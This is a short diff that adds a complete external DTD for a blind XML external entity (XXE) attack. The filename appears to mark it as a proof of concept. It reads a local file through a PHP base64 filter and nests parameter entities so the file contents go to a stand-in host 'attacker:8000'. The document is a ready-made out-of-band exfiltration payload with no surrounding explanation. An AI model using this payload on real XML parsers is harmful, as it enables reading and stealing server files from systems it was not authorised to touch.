@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/tmp/rq-c1-poc-marker">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker:8000/?x=%file;'>">
+%eval;
+%exfil;
